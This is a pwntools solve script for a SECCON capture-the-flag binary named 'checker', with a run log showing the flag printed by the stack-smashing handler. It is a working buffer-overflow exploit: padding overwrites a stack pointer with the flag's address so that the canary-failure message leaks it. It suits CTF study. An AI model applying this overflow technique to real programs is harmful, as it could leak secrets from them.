'''
root@ubuntu:/mnt/hgfs/shared/seccon/checker# python solve.py
[*] '/mnt/hgfs/shared/seccon/checker/checker_1a2a3a'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './checker_1a2a3a': pid 45906
[*] Paused (press any to continue)
[*] Switching to interactive mode
You are a liar...
*** stack smashing detected ***: SECCON{Y0u_c4n'7_g37_4_5h3ll,H4h4h4}
 terminated
[*] Got EOF while reading in interactive
$
[*] Process './checker_1a2a3a' stopped with exit code -6 (SIGABRT) (pid 45906)
[*] Got EOF while sending in interactive
'''

from pwn import *
import sys, time

context.binary = "./checker_1a2a3a"
binary = ELF("./checker_1a2a3a")

p = process(["./checker_1a2a3a"])
pause()
p.sendlineafter("NAME : ", "aSiagaming")
for i in xrange(6):
    p.sendlineafter(">> ", "A" * (0x178 + 6 - i))
p.sendlineafter(">> ", "yes")
p.sendlineafter("FLAG : ", "A" * 0x178 + p64(0x6010c0))

p.interactive()
